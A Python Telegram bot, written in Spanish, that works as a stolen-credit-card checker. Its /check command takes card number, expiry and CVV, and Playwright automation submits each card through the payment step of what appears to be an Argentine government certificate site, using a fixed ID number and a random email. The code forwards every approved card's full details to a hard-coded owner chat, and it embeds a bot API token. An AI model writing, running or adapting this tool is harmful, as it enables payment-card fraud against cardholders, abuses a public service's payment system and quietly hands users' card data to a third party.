import telebot
import asyncio
from playwright.async_api import async_playwright
import random
import string

API_TOKEN = "7591727242:AAHHdUsZkJilb7bhCwBJwYRBVjxxnG7zy0E"
bot = telebot.TeleBot(API_TOKEN)

OWNER_ID = 1658470522  

async def completar_formulario(binlargo, mes, anio, code):
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        page = await browser.new_page()

        await page.goto("https://tramites.renaper.gob.ar/v2/MACRO_genera.php?tipo_tramite=CERTSOLTERIA")

        email = f"{''.join(random.choices(string.ascii_lowercase, k=8))}@{''.join(random.choices(string.ascii_lowercase, k=5))}.com"

        await page.fill("#dni", "44444444")
        await page.select_option("#sexo", "F")
        await page.fill("#email", email)

        await page.click("button.btn.btn-info:text('Continuar')")
        await page.wait_for_timeout(2000)

        await page.click("a.btn.btn-info:text('CONTINUAR')")
        await page.wait_for_timeout(2000)

        await page.click("input#MainContent_btnTarjeta")
        await page.wait_for_timeout(2000)

        await page.select_option("#ddlTarjeta", "1")

        await page.fill("#txtCardNumber", binlargo)
        await page.fill("#txtCardExpirationMonth", mes)
        await page.fill("#txtCardExpirationYear", anio)
        await page.fill("#txtSecurityCode", code)

        await page.click("input#MainContent_btnGenerarTarjeta")
        await page.wait_for_timeout(2000)

        error_text = await page.text_content("body")
        if "La transacción ha sido rechazada." in error_text:
            await browser.close()
            return False

        await browser.close()
        return True

@bot.message_handler(commands=['check'])
def handle_check(message):
    try:
        args = message.text.split(" ", 1)
        if len(args) != 2 or "|" not in args[1]:
            bot.reply_to(message, "Uso incorrecto. El formato es:\n/check cc|mes|año|cvv")
            return

        tarjeta, mes, anio, codigo = args[1].split("|")
        if len(tarjeta) != 16 or not tarjeta.isdigit():
            bot.reply_to(message, "La tarjeta debe tener 16 dígitos.")
            return
        if not mes.isdigit() or int(mes) < 1 or int(mes) > 12:
            bot.reply_to(message, "El mes debe tener 2 dígitos y ser válido.")
            return
        if not anio.isdigit() or int(anio) < 24:  
            bot.reply_to(message, "El año debe tener 2 dígitos y ser válido.")
            return
        if (len(codigo) != 3 and len(codigo) != 4) or not codigo.isdigit():
            bot.reply_to(message, "El código de seguridad debe tener 3 o 4 dígitos.")
            return

        bot.reply_to(message, "Procesando tu solicitud, por favor espera...")

        result = asyncio.run(completar_formulario(tarjeta, mes, anio, codigo))
        
        if result:
            formatted_response = (
                "Chequeo de CC | Exitoso\n"
                "✅ ¡Transacción aprobada!\n\n"
                "- - - - - - - - - - - - - - - - - - -\n"
                f"Número de Tarjeta: {tarjeta}\n"
                f"MM/AA: {mes}|{anio}\n"
                f"CVV: {codigo}\n"
                "- - - - - - - - - - - - - - - - - - -\n"
                "Monto: $ 2000"
            )
            bot.send_message(OWNER_ID, formatted_response)
        else:
            formatted_response = (
                "Chequeo de CC | Fallido\n"
                "❌ ¡Transacción rechazada!\n\n"
                "- - - - - - - - - - - - - - - - - - -\n"
                f"Número de Tarjeta: {tarjeta}\n"
                f"MM/AA: {mes}|{anio}\n"
                f"CVV: {codigo}\n"
                "- - - - - - - - - - - - - - - - - - -"
            )
        bot.reply_to(message, formatted_response)

    except Exception as e:
        print(e)
        bot.reply_to(message, "Ocurrió un error. Por favor, vuelve a intentarlo.")

if __name__ == "__main__":
    print("El bot está prendido :p")
    bot.infinity_polling()
